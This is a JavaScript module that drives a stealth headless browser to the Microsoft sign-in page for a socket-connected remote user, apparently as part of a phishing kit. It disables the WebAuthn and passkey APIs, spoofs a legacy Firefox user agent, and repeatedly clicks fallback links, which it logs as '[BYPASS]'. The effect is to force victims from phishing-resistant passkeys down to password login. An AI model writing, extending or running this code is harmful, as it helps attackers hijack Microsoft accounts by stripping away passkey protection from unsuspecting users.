const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();

        /**
         * 2026 NUCLEAR WEBAUTHN DISABLE
         * This targets every possible API Microsoft uses to trigger Passkeys.
         */
        await page.evaluateOnNewDocument(() => {
            const block = () => { throw new DOMException("Hardware not supported", "NotAllowedError"); };
            
            // Disable Credential Manager
            if (navigator.credentials) {
                navigator.credentials.get = block;
                navigator.credentials.create = block;
            }

            // Kill Public Key APIs
            window.PublicKeyCredential = undefined;
            
            // Disable Conditional UI (the 'auto' passkey popup)
            if (window.PublicKeyCredential) {
                PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
                PublicKeyCredential.isConditionalMediationAvailable = () => Promise.resolve(false);
            }

            // Spoof a legacy browser environment that CANNOT support FIDO2
            Object.defineProperty(navigator, 'userAgent', {
                get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0'
            });
        });

        await page.setViewport({ width: 1280, height: 720 });
        
        // Navigation
        page.goto('https://login.microsoftonline.com/').catch(() => {});

        // THE "FORCE FALLBACK" SCANNER
        // This clicks the 'Sign in another way' link immediately if it appears
        const scanner = setInterval(async () => {
            try {
                const fallbackLinks = [
                    '#iShowSkip', 
                    '#idBtn_Back', 
                    'a[data-bind*="switchToPassword"]', 
                    '#otherWays',
                    'input[value="Cancel"]'
                ];
                for (const sel of fallbackLinks) {
                    const btn = await page.$(sel);
                    if (btn) {
                        console.log(`[BYPASS] Clicking Fallback: ${sel}`);
                        await btn.click();
                    }
                }
            } catch (e) {}
        }, 2000);

        // ... rest of your action and frame logic ...

        socket.on('disconnect', () => {
            clearInterval(scanner);
            if (browser) browser.close();
        });

    } catch (e) { if (browser) browser.close(); }
}

module.exports = { startSession };
